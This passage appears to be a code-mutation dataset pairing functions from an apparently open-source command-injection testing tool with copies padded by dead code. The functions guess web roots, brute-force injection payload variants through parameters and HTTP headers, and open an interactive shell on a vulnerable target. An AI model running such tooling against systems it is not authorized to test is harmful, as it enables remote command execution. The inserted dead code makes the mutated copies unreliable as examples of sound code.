menu.options.web_root\n    else:\n        if 'apache' in settings.SERVER_BANNER.lower():\n            if 'debian' or 'ubuntu' in settings.SERVER_BANNER.lower():\n                try:\n                    check_version = re.findall('/(.*)\\\\.', settings.SERVER_BANNER.lower())\n                    if check_version[0] > '2.3' and (not settings.TARGET_OS == settings.OS.WINDOWS):\n                        settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n                    else:\n                        settings.WEB_ROOT = settings.WEB_ROOT\n                except IndexError:\n                    pass\n            elif 'fedora' or 'centos' in settings.SERVER_BANNER.lower():\n                settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n            else:\n                pass\n        elif 'nginx' in settings.SERVER_BANNER.lower():\n            try:\n                check_version = re.findall('/(.*)\\\\.', settings.SERVER_BANNER.lower())\n                if check_version[0] >= '1.2.4':\n                    settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n                else:\n                    settings.WEB_ROOT = settings.WEB_ROOT + '/www'\n            except IndexError:\n                pass\n        elif 'microsoft-iis' in settings.SERVER_BANNER.lower():\n            pass\n        else:\n            custom_web_root(url, timesec, filename, http_request_method, url_time_response)\n        path = _urllib.parse.urlparse(url).path\n        path_parts = path.split('/')\n        count = 0\n        for part in path_parts:\n            count = count + 1\n        count = count - 1\n        last_param = path_parts[count]\n        EXTRA_DIR = path.replace(last_param, '')\n        settings.WEB_ROOT = settings.WEB_ROOT + EXTRA_DIR\n        if settings.TARGET_OS == settings.OS.WINDOWS:\n            settings.WEB_ROOT = settings.WEB_ROOT.replace('/', '\\\\')\n    return tmp_path"
        ]
    },
    {
        "func_name": "finalize",
        "original": "def finalize(exit_loops, no_result, float_percent, injection_type, technique):\n    if exit_loops == False:\n        if settings.VERBOSITY_LEVEL == 0:\n            if str(float_percent) == '100.0':\n                if no_result == True:\n                    percent = settings.FAIL_STATUS\n                else:\n                    percent = '.. (' + str(float_percent) + '%)'\n            else:\n                percent = '.. (' + str(float_percent) + '%)'\n            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n            sys.stdout.flush()\n            return True\n        else:\n            return True\n    else:\n        return False",
        "mutated": [
            "def finalize(exit_loops, no_result, float_percent, injection_type, technique):\n    if False:\n        i = 10\n    if exit_loops == False:\n        if settings.VERBOSITY_LEVEL == 0:\n            if str(float_percent) == '100.0':\n                if no_result == True:\n                    percent = settings.FAIL_STATUS\n                else:\n                    percent = '.. (' + str(float_percent) + '%)'\n            else:\n                percent = '.. (' + str(float_percent) + '%)'\n            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n            sys.stdout.flush()\n            return True\n        else:\n            return True\n    else:\n        return False",
            "def finalize(exit_loops, no_result, float_percent, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if exit_loops == False:\n        if settings.VERBOSITY_LEVEL == 0:\n            if str(float_percent) == '100.0':\n                if no_result == True:\n                    percent = settings.FAIL_STATUS\n                else:\n                    percent = '.. (' + str(float_percent) + '%)'\n            else:\n                percent = '.. (' + str(float_percent) + '%)'\n            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n            sys.stdout.flush()\n            return True\n        else:\n            return True\n    else:\n        return False",
            "def finalize(exit_loops, no_result, float_percent, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if exit_loops == False:\n        if settings.VERBOSITY_LEVEL == 0:\n            if str(float_percent) == '100.0':\n                if no_result == True:\n                    percent = settings.FAIL_STATUS\n                else:\n                    percent = '.. (' + str(float_percent) + '%)'\n            else:\n                percent = '.. (' + str(float_percent) + '%)'\n            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n            sys.stdout.flush()\n            return True\n        else:\n            return True\n    else:\n        return False",
            "def finalize(exit_loops, no_result, float_percent, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if exit_loops == False:\n        if settings.VERBOSITY_LEVEL == 0:\n            if str(float_percent) == '100.0':\n                if no_result == True:\n                    percent = settings.FAIL_STATUS\n                else:\n                    percent = '.. (' + str(float_percent) + '%)'\n            else:\n                percent = '.. (' + str(float_percent) + '%)'\n            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n            sys.stdout.flush()\n            return True\n        else:\n            return True\n    else:\n        return False",
            "def finalize(exit_loops, no_result, float_percent, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if exit_loops == False:\n        if settings.VERBOSITY_LEVEL == 0:\n            if str(float_percent) == '100.0':\n                if no_result == True:\n                    percent = settings.FAIL_STATUS\n                else:\n                    percent = '.. (' + str(float_percent) + '%)'\n            else:\n                percent = '.. (' + str(float_percent) + '%)'\n            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n            sys.stdout.flush()\n            return True\n        else:\n            return True\n    else:\n        return False"
        ]
    },
    {
        "func_name": "fb_injection_handler",
        "original": "def fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    shell = False\n    counter = 1\n    vp_flag = True\n    exit_loops = False\n    no_result = True\n    is_encoded = False\n    stop_injection = False\n    call_tmp_based = False\n    next_attack_vector = False\n    export_injection_info = False\n    tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)\n    if not settings.LOAD_SESSION or settings.RETEST == True:\n        TAG = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Using '\" + settings.WEB_ROOT + \"' as web server document root.\"\n            print(settings.print_debug_msg(debug_msg))\n        info_msg = \"Trying to create a file in '\" + settings.WEB_ROOT\n        info_msg += \"' for command execution output. \"\n        print(settings.print_info_msg(info_msg))\n    i = 0\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    alter_shell = menu.options.alter_shell\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    if settings.LOAD_SESSION:\n                        try:\n                            settings.FILE_BASED_STATE = True\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                            OUTPUT_TEXTFILE = TAG + '.txt'\n                            session_handler.notification(url, technique, injection_type)\n                            if technique == 'tempfile-based injection technique':\n                                tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    if settings.RETEST == True:\n                        settings.RETEST = False\n                        from src.core.injections.results_based.techniques.classic import cb_handler\n                        cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)\n                    if not settings.LOAD_SESSION:\n                        i = i + 1\n                        OUTPUT_TEXTFILE = TAG + '.txt'\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        try:\n                            if alter_shell:\n                                payload = fb_payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)\n                            else:\n                                payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)\n                            payload = parameters.prefixes(payload, prefix)\n                            payload = parameters.suffixes(payload, suffix)\n                            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                            payload = checks.perform_payload_modification(payload)\n                            if settings.VERBOSITY_LEVEL != 0:\n                                payload_msg = payload.replace('\\n', '\\\\n')\n                                print(settings.print_payload(payload_msg))\n                            if settings.COOKIE_INJECTION == True:\n                                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                response = fb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                            elif settings.USER_AGENT_INJECTION == True:\n                                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                response = fb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                            elif settings.REFERER_INJECTION == True:\n                                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                response = fb_injector.referer_injection_test(url, vuln_parameter, payload)\n                            elif settings.HOST_INJECTION == True:\n                                vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                response = fb_injector.host_injection_test(url, vuln_parameter, payload)\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                response = fb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                            else:\n                                (response, vuln_parameter) = fb_injector.injection_test(payload, http_request_method, url)\n                            output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, timesec)\n                            time.sleep(timesec)\n                            try:\n                                request = _urllib.request.Request(output)\n                                headers.do_check(request)\n                                headers.check_http_traffic(request)\n                                if menu.options.proxy or menu.options.ignore_proxy:\n                                    response = proxy.use_proxy(request)\n                                elif menu.options.tor:\n                                    response = tor.use_tor(request)\n                                else:\n                                    response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)\n                                if type(response) is bool:\n                                    html_data = ''\n                                else:\n                                    html_data = checks.page_encoding(response, action='decode')\n                                shell = re.findall('' + TAG + '', str(html_data))\n                                if len(shell) != 0 and shell[0] == TAG and (not settings.VERBOSITY_LEVEL != 0):\n                                    percent = settings.info_msg\n                                    info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                    sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                    sys.stdout.flush()\n                                if len(shell) == 0:\n                                    raise _urllib.error.HTTPError(url, 404, 'Error', {}, None)\n                            except _urllib.error.HTTPError as e:\n                                if str(e.getcode()) == settings.NOT_FOUND_ERROR:\n                                    percent = i * 100 / total\n                                    float_percent = '{0:.1f}'.format(round(i * 100 / (total * 1.0), 2))\n                                    if call_tmp_based == True:\n                                        exit_loops = True\n                                        tmp_path = os.path.split(menu.options.file_dest)[0] + '/'\n                                        tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                                        raise\n                                    elif i == int(menu.options.failed_tries) and no_result == True or i == total:\n                                        if i == total:\n                                            if finalize(exit_loops, no_result, float_percent, injection_type, technique):\n                                                continue\n                                            else:\n                                                raise\n                                        tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)\n                                        sys.stdout.write('\\r')\n                                        message = \"It seems that you don't have permissions to \"\n                                        message += \"read and/or write files in '\" + settings.WEB_ROOT + \"'.\"\n                                        if not menu.options.web_root:\n                                            message += \" You are advised to rerun with option '--web-root'.\"\n                                        while True:\n                                            message = message + \"\\nDo you want to use the temporary directory ('\" + tmp_path + \"')? [Y/n] > \"\n                                            tmp_upload = common.read_input(message, default='Y', check_batch=True)\n                                            if tmp_upload in settings.CHOICE_YES:\n                                                exit_loops = True\n                                                settings.TEMPFILE_BASED_STATE = True\n                                                call_tfb = tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                                                if call_tfb != False:\n                                                    return True\n                                                elif no_result == True:\n                                                    return False\n                                                else:\n                                                    return True\n                                            elif tmp_upload in settings.CHOICE_NO:\n                                                break\n                                            elif tmp_upload in settings.CHOICE_QUIT:\n                                                print(settings.SINGLE_WHITESPACE)\n                                                raise\n                                            else:\n                                                common.invalid_option(tmp_upload)\n                                                pass\n                                        continue\n                                    elif finalize(exit_loops, no_result, float_percent, injection_type, technique):\n                                        continue\n                                    else:\n                                        raise\n                                elif str(e.getcode()) == settings.UNAUTHORIZED_ERROR:\n                                    err_msg = 'Authorization required!'\n                                    print(settings.print_critical_msg(err_msg) + '\\n')\n                                    raise SystemExit()\n                                elif str(e.getcode()) == settings.FORBIDDEN_ERROR:\n                                    err_msg = \"You don't have permission to access this page.\"\n                                    print(settings.print_critical_msg(err_msg) + '\\n')\n                                    raise SystemExit()\n                        except (KeyboardInterrupt, SystemExit):\n                            if 'vuln_parameter' in locals():\n                                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            raise\n                        except _urllib.error.URLError as e:\n                            warn_msg = \"It seems that you don't have permissions to \"\n                            warn_msg += \"read and/or write files in '\" + settings.WEB_ROOT + \"'.\"\n                            sys.stdout.write('\\r' + settings.print_warning_msg(warn_msg))\n                            err_msg = str(e).replace(': ', ' (') + ').'\n                            if settings.VERBOSITY_LEVEL >= 2:\n                                print(settings.SINGLE_WHITESPACE)\n                            print(settings.print_critical_msg(err_msg))\n                            if not menu.options.web_root:\n                                custom_web_root(url, timesec, filename, http_request_method, url_time_response)\n                            continue\n                        except:\n                            raise\n                    if shell:\n                        settings.FILE_BASED_STATE = True\n                        found = True\n                        no_result = False\n                        settings.DETECTION_PHASE = False\n                        settings.EXPLOITATION_PHASE = True\n                        if not settings.VERBOSITY_LEVEL != 0 and (not menu.options.alter_shell) and (not next_attack_vector):\n                            next_attack_vector = True\n                        if settings.COOKIE_INJECTION == True:\n                            header_name = ' cookie'\n                            found_vuln_parameter = vuln_parameter\n                            the_type = ' parameter'\n                        elif settings.USER_AGENT_INJECTION == True:\n                            header_name = ' User-Agent'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.REFERER_INJECTION == True:\n                            header_name = ' Referer'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.HOST_INJECTION == True:\n                            header_name = 'Host'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.CUSTOM_HEADER_INJECTION == True:\n                            header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        else:\n                            header_name = ''\n                            the_type = ' parameter'\n                            if not settings.USER_DEFINED_POST_DATA:\n                                found_vuln_parameter = parameters.vuln_GET_param(url)\n                            else:\n                                found_vuln_parameter = vuln_parameter\n                        if len(found_vuln_parameter) != 0:\n                            found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                        if export_injection_info == False:\n                            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                        if vp_flag == True:\n                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                        logs.update_payload(filename, counter, payload)\n                        counter = counter + 1\n                        if not settings.LOAD_SESSION:\n                            if settings.VERBOSITY_LEVEL == 0:\n                                print(settings.SINGLE_WHITESPACE)\n                            else:\n                                checks.total_of_requests()\n                        info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                        info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                        print(settings.print_bold_info_msg(info_msg))\n                        sub_content = str(checks.url_decode(payload))\n                        print(settings.print_sub_content(sub_content))\n                        if not settings.LOAD_SESSION:\n                            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)\n                        else:\n                            whitespace = settings.WHITESPACES[0]\n                            settings.LOAD_SESSION = False\n                        new_line = True\n                        if settings.ENUMERATION_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                if enumerate_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    break\n                                elif enumerate_again in settings.CHOICE_NO:\n                                    new_line = False\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.enumeration_options():\n                            fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        if settings.FILE_ACCESS_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                file_access_again = common.read_input(message, default='N', check_batch=True)\n                                if file_access_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    break\n                                elif file_access_again in settings.CHOICE_NO:\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.file_access_options():\n                            fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        if menu.options.os_cmd:\n                            fb_enumeration.single_os_cmd_exec(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                        try:\n                            checks.alert()\n                            go_back = False\n                            go_back_again = False\n                            while True:\n                                delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                if go_back == True:\n                                    break\n                                message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                if settings.CRAWLING:\n                                    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                if not settings.STDIN_PARSING:\n                                    gotshell = common.read_input(message, default='Y', check_batch=True)\n                                else:\n                                    gotshell = common.read_input(message, default='n', check_batch=True)\n                                if gotshell in settings.CHOICE_YES:\n                                    print(settings.OS_SHELL_TITLE)\n                                    if settings.READLINE_ERROR:\n                                        checks.no_readline_module()\n                                    while True:\n                                        if not settings.READLINE_ERROR:\n                                            checks.tab_autocompleter()\n                                        sys.stdout.write(settings.OS_SHELL)\n                                        cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                        cmd = checks.escaped_cmd(cmd)\n                                        if cmd.lower() in settings.SHELL_OPTIONS:\n                                            (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE)\n                                            if go_back and go_back_again == False:\n                                                break\n                                            if go_back and go_back_again:\n                                                return True\n                                        else:\n                                            time.sleep(timesec)\n                                            response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)\n                                                shell = ''.join((str(p) for p in shell))\n                                                if not menu.options.ignore_session:\n                                                    session_handler.store_cmd(url, cmd, shell, vuln_parameter)\n                                            else:\n                                                shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                            if shell or shell != '':\n                                                logs.executed_command(filename, cmd, shell)\n                                                print(settings.command_execution_output(shell))\n                                            else:\n                                                err_msg = common.invalid_cmd_output(cmd)\n                                                print(settings.print_critical_msg(err_msg))\n                                elif gotshell in settings.CHOICE_NO:\n                                    if checks.next_attack_vector(technique, go_back) == True:\n                                        break\n                                    elif no_result == True:\n                                        return False\n                                    else:\n                                        return True\n                                elif gotshell in settings.CHOICE_QUIT:\n                                    delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(gotshell)\n                                    pass\n                        except KeyboardInterrupt:\n                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)\n                            raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
        "mutated": [
            "def fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n    shell = False\n    counter = 1\n    vp_flag = True\n    exit_loops = False\n    no_result = True\n    is_encoded = False\n    stop_injection = False\n    call_tmp_based = False\n    next_attack_vector = False\n    export_injection_info = False\n    tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)\n    if not settings.LOAD_SESSION or settings.RETEST == True:\n        TAG = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Using '\" + settings.WEB_ROOT + \"' as web server document root.\"\n            print(settings.print_debug_msg(debug_msg))\n        info_msg = \"Trying to create a file in '\" + settings.WEB_ROOT\n        info_msg += \"' for command execution output. \"\n        print(settings.print_info_msg(info_msg))\n    i = 0\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    alter_shell = menu.options.alter_shell\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    if settings.LOAD_SESSION:\n                        try:\n                            settings.FILE_BASED_STATE = True\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                            OUTPUT_TEXTFILE = TAG + '.txt'\n                            session_handler.notification(url, technique, injection_type)\n                            if technique == 'tempfile-based injection technique':\n                                tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    if settings.RETEST == True:\n                        settings.RETEST = False\n                        from src.core.injections.results_based.techniques.classic import cb_handler\n                        cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)\n                    if not settings.LOAD_SESSION:\n                        i = i + 1\n                        OUTPUT_TEXTFILE = TAG + '.txt'\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        try:\n                            if alter_shell:\n                                payload = fb_payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)\n                            else:\n                                payload = fb_payloads.decision(separator, TAG, OUTPUT_TEXTFILE)\n                            payload = parameters.prefixes(payload, prefix)\n                            payload = parameters.suffixes(payload, suffix)\n                            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                            payload = checks.perform_payload_modification(payload)\n                            if settings.VERBOSITY_LEVEL != 0:\n                                payload_msg = payload.replace('\\n', '\\\\n')\n                                print(settings.print_payload(payload_msg))\n                            if settings.COOKIE_INJECTION == True:\n                                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                response = fb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                            elif settings.USER_AGENT_INJECTION == True:\n                                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                response = fb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                            elif settings.REFERER_INJECTION == True:\n                                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                response = fb_injector.referer_injection_test(url, vuln_parameter, payload)\n                            elif settings.HOST_INJECTION == True:\n                                vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                response = fb_injector.host_injection_test(url, vuln_parameter, payload)\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                response = fb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                            else:\n                                (response, vuln_parameter) = fb_injector.injection_test(payload, http_request_method, url)\n                            output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, timesec)\n                            time.sleep(timesec)\n                            try:\n                                request = _urllib.request.Request(output)\n                                headers.do_check(request)\n                                headers.check_http_traffic(request)\n                                if menu.options.proxy or menu.options.ignore_proxy:\n                                    response = proxy.use_proxy(request)\n                                elif menu.options.tor:\n                                    response = tor.use_tor(request)\n                                else:\n                                    response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)\n                                if type(response) is bool:\n                                    html_data = ''\n                                else:\n                                    html_data = checks.page_encoding(response, action='decode')\n                                shell = re.findall('' + TAG + '', str(html_data))\n                                if len(shell) != 0 and shell[0] == TAG and (not settings.VERBOSITY_LEVEL != 0):\n                                    percent = settings.info_msg\n                                    info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                    sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                    sys.stdout.flush()\n                                if len(shell) == 0:\n                                    raise _urllib.error.HTTPError(url, 404, 'Error', {}, None)\n                            except _urllib.error.HTTPError as e:\n                                if str(e.getcode()) == settings.NOT_FOUND_ERROR:\n                                    percent = i * 100 / total\n                                    float_percent = '{0:.1f}'.format(round(i * 100 / (total * 1.0), 2))\n                                    if call_tmp_based == True:\n                                        exit_loops = True\n                                        tmp_path = os.path.split(menu.options.file_dest)[0] + '/'\n                                        tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                                        raise\n                                    elif i == int(menu.options.failed_tries) and no_result == True or i == total:\n                                        if i == total:\n                                            if finalize(exit_loops, no_result, float_percent, injection_type, technique):\n                                                continue\n                                            else:\n                                                raise\n                                        tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)\n                                        sys.stdout.write('\\r')\n                                        message = \"It seems that you don't have permissions to \"\n                                        message += \"read and/or write files in '\" + settings.WEB_ROOT + \"'.\"\n                                        if not menu.options.web_root:\n                                            message += \" You are advised to rerun with option '--web-root'.\"\n                                        while True:\n                                            message = message + \"\\nDo you want to use the temporary directory ('\" + tmp_path + \"')? [Y/n] > \"\n                                            tmp_upload = common.read_input(message, default='Y', check_batch=True)\n                                            if tmp_upload in settings.CHOICE_YES:\n                                                exit_loops = True\n                                                settings.TEMPFILE_BASED_STATE = True\n                                                call_tfb = tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)\n                                                if call_tfb != False:\n                                                    return True\n                                                elif no_result == True:\n                                                    return False\n                                                else:\n                                                    return True\n                                            elif tmp_upload in settings.CHOICE_NO:\n                                                break\n                                            elif tmp_upload in settings.CHOICE_QUIT:\n                                                print(settings.SINGLE_WHITESPACE)\n                                                raise\n                                            else:\n                                                common.invalid_option(tmp_upload)\n                                                pass\n                                        continue\n                                    elif finalize(exit_loops, no_result, float_percent, injection_type, technique):\n                                        continue\n                                    else:\n                                        raise\n                                elif str(e.getcode()) == settings.UNAUTHORIZED_ERROR:\n                                    err_msg = 'Authorization required!'\n                                    print(settings.print_critical_msg(err_msg) + 